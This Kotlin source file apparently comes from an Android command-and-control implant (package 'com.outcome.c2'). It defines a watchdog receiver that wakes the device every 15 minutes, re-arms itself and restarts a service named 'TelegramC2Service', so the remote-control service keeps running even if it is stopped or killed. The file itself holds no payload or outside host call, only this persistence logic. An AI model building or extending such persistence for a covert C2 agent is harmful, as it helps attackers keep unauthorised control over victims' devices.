package com.outcome.c2

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
import android.util.Log

/**
 * Alarm-based watchdog. Every 15 minutes it re-arms itself and
 * requests a start of TelegramC2Service. If the service is already
 * running, Android ignores the redundant start (onStartCommand is called
 * again, harmless).
 */
class WatchdogReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "Watchdog"
        private const val INTERVAL_MS = 15L * 60L * 1000L
        private const val REQ_CODE = 0xC2

        fun schedule(ctx: Context) {
            try {
                val am = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val intent = Intent(ctx, WatchdogReceiver::class.java).apply {
                    action = "com.outcome.c2.WATCHDOG"
                }
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                else
                    PendingIntent.FLAG_UPDATE_CURRENT
                val pi = PendingIntent.getBroadcast(ctx, REQ_CODE, intent, flags)

                val triggerAt = SystemClock.elapsedRealtime() + INTERVAL_MS
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    if (am.canScheduleExactAlarms()) {
                        am.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                        )
                    } else {
                        am.setAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                        )
                    }
                } else {
                    am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                    )
                }
                Log.i(TAG, "scheduled next check in ${INTERVAL_MS / 60000} min")
            } catch (e: Exception) {
                Log.w(TAG, "schedule failed: ${e.message}")
            }
        }
    }

    override fun onReceive(ctx: Context, intent: Intent) {
        Log.i(TAG, "watchdog tick")
        LogBus.append(ctx.applicationContext, "WD", "watchdog tick")

        // Re-arm first
        schedule(ctx)

        // Ask Android to (re)start the service. If it's already running,
        // onStartCommand is called again — harmless because our service
        // doesn't re-initialize critical state in onStartCommand.
        try {
            val svc = Intent(ctx, TelegramC2Service::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(svc)
            } else {
                ctx.startService(svc)
            }
            Log.i(TAG, "requested service start")
            LogBus.append(ctx.applicationContext, "WD", "requested service start")
        } catch (e: Exception) {
            Log.w(TAG, "restart failed: ${e.message}")
            LogBus.append(ctx.applicationContext, "WD", "restart failed: ${e.message}")
        }
    }
}
